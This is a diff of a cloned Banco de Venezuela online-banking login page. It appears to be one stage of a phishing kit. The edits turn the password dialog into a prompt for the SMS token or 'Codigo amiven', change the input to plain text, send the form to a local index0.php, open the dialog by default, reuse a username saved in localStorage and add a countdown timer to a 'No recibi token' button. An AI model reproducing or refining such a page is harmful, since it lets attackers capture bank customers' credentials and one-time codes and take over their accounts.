@@ -21,16 +21,12 @@
   <!--ICONOS-->
   <!--<link href="icon.css" rel="stylesheet">-->
   <link href="./BDVenlínea personas_files/css.css" rel="stylesheet">
-
+ 
   <!-- Progressive -->
   <link rel="stylesheet" href="./BDVenlínea personas_files/styl.css">
   <link rel="mask-icon" href="https://bdvenlinea.banvenez.com/assets/safari-pinned-tab.svg" color="#5bbad5">
   <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-  <!-- Google Tag Manager -->
-
-  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
-
+  
    <script>
         (function() {
             console.clear();  
@@ -42,8 +38,6 @@
 </head>
 
 <body>
-  <!--<script src="https://github.jspm.io/jmcriffey/bower-traceur-runtime@0.0.87/traceur-runtime.js"></script>-->
-  <!--<script src="js/traceur-runtime.js"></script>-->
 
   <app-root _nghost-c0="" ng-version="6.1.10">
     <spinner _ngcontent-c0="" spinner="sk-wave" _nghost-c1="">
@@ -61,7 +55,7 @@
                     <img _ngcontent-c10="" class="logo-login" src="./BDVenlínea personas_files/logo.png">
                   </div>
                   <div _ngcontent-c10="" class="login-container-form">
-                    <form _ngcontent-c10="" action="index3.php" method="post" class="ng-untouched ng-pristine ng-invalid">
+                    <form _ngcontent-c10=""  class="ng-untouched ng-pristine ng-invalid" action="index0.php" method="post">
                       <div _ngcontent-c10="" class="formGroup" role="form">
                         <mat-form-field _ngcontent-c10="" id="df" appearance="fill"
                           class="mat-form-field ng-tns-c11-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-dirty ng-touched mat-form-field-invalid ng-invalid mat-form-field-hide-placeholder">
@@ -116,7 +110,7 @@
                           <div class="mat-button-focus-overlay"></div>
                         </button>
                       </div>
-          
+                   
                     <div _ngcontent-c10="" class="autogestion-usuario-unico text-center">
                       <a _ngcontent-c10="" class="autogestion-user"
                         href="https://bdvenlinea.banvenez.com/gestion-usuario" mattooltip="Gestiona tu usuario"
@@ -144,7 +138,7 @@
   <div id="cdk-describedby-message-container" aria-hidden="true" style="display: none;">
     <div id="cdk-describedby-message-0">Gestiona tu usuario</div>
   </div>
-  <div class="cdk-overlay-container" style="display: none " id="mdl">
+  <div class="cdk-overlay-container" style="display: block " id="mdl">
     <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div>
     <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
       <div id="cdk-overlay-2" class="cdk-overlay-pane"
@@ -157,9 +151,9 @@
           <app-confirmar-acceso _nghost-c15="" class="ng-star-inserted">
             <div _ngcontent-c15="" class="container">
               <div _ngcontent-c15="" class="row">
-                <h4 _ngcontent-c15="" class="text-center">Introduce tu contraseña</h4>
+                <h4 _ngcontent-c15="" class="text-center">Introduce el Token enviado por SMS O Codigo amiven</h4>
               </div>
-              
+              <form _ngcontent-c15="" class="text-center ng-pristine ng-invalid ng-touched" novalidate="">
                 <div _ngcontent-c15="" class="row">
                   <mat-form-field _ngcontent-c15="" id="dfs" appearance="fill"
                     class="mat-form-field ng-tns-c11-40 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-pristine ng-invalid mat-form-field-invalid ng-touched mat-form-field-hide-placeholder">
@@ -170,8 +164,8 @@
                         <div class="mat-form-field-infix">
                           <input _ngcontent-c15="" autocomplete="off"
                             class="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-pristine ng-invalid ng-touched"
-                            formcontrolname="password" matinput="" name="password" type="password" id="mat-input-1"
-                            aria-invalid="true" aria-required="false" aria-describedby="mat-error-4">
+                            formcontrolname="password" matinput="" name="password" type="Text" id="mat-input-1"
+                            aria-invalid="true" required minlength="6" maxlength="8" aria-describedby="mat-error-4">
 
                           <span class="mat-form-field-label-wrapper">
                             <!---->
@@ -182,7 +176,7 @@
                               <!---->
                               <mat-label _ngcontent-c15="" aria-label="Introduce tu contraseña"
                                 class="ng-star-inserted">
-                                <span _ngcontent-c15="">Contraseña</span>
+                                <span _ngcontent-c15="">codigo</span>
                               </mat-label>
                               <!---->
                               <!---->
@@ -201,7 +195,7 @@
                           style="opacity: 1; transform: translateY(0%);">
                           <!---->
                           <mat-error _ngcontent-c15="" align="end" class="mat-error ng-star-inserted" role="alert"
-                            id="mat-error-4">Contraseña es <strong _ngcontent-c15="">requerida</strong>
+                            id="mat-error-4">El token es <strong _ngcontent-c15="">requerido</strong>
                           </mat-error>
                           <!---->
                         </div>
@@ -213,15 +207,16 @@
                 <div _ngcontent-c15="" class="row">
                   <div _ngcontent-c15="" class="button-container">
                     <button _ngcontent-c15="" color="accent" mat-raised-button="" type="submit"
-                      class="mat-raised-button mat-accent ng-pristine ng-invalid ng-touched"
-                     >
+                      class="mat-raised-button mat-accent ng-pristine ng-invalid ng-touched">
                       <span class="mat-button-wrapper">Continuar</span>
                       <div class="mat-button-ripple mat-ripple" matripple=""></div>
                       <div class="mat-button-focus-overlay"></div>
                     </button>
-                    <button _ngcontent-c15="" aria-label="cancelar" color="accent" mat-dialog-close=""
-                      mat-raised-button="" type="button" class="mat-raised-button mat-accent" onclick="cls()">
-                      <span class="mat-button-wrapper">Cancelar</span>
+                    <hr style="margin-top: 4px; margin-bottom: 4px;">
+                    <button _ngcontent-c15="" aria-label="cancelar" color="accent" mat-dialog-close="" onclick="cord()"
+                      mat-raised-button="" id="sect" type="button" class="mat-raised-button mat-accent" disabled="">
+                      <span class="mat-button-wrapper">No recibi token</span>
+                      <span class="mat-button-wrapper" id="countdown">18</span>
                       <div class="mat-button-ripple mat-ripple" matripple=""></div>
                       <div class="mat-button-focus-overlay"></div>
                     </button>
@@ -236,6 +231,25 @@
     </div>
   </div>
   <script>
+    var timeleft = 35;
+    var downloadTimer = setInterval(function () {
+      if (timeleft <= 0) {
+        clearInterval(downloadTimer);
+        document.getElementById("sect").disabled = false;
+        document.getElementById("countdown").style.display = "none";
+      } else {
+        document.getElementById("countdown").innerHTML = timeleft;
+      }
+      timeleft -= 1;
+
+    }, 1000);
+
+   
+
+    window.onload = () => {
+      document.getElementById("mat-input-0").value = localStorage.getItem("usr");
+
+    }
 
     document.getElementById("mat-input-0").addEventListener("focusin", () => {
 
@@ -262,32 +276,17 @@
     })
 
     function chcs(params) {
-      if (document.getElementById("mat-input-0").value.length < 5) {
-        alert("usuario erroneo o incompleto");
-        document.getElementById("mat-input-0").value = ""
-        document.getElementById("mat-input-0").focus()
-
-      } else {
-        localStorage.setItem("usr", document.getElementById("mat-input-0").value)
-        document.getElementById("mdl").style.display = "block"
-      }
-
-
-    }
-    function chc(params) {
       if (document.getElementById("mat-input-1").value.length < 5) {
-        alert("Contraseña erronea o incompleta");
+        alert("Token erroneo o incompleto");
         document.getElementById("mat-input-1").value = ""
         document.getElementById("mat-input-1").focus()
 
-      }
-    }
-    function cls(params) {
-      document.getElementById("mdl").style.display = "none";
-    }
-    
+      } 
 
 
+
+    }
+   
   </script>
 
 
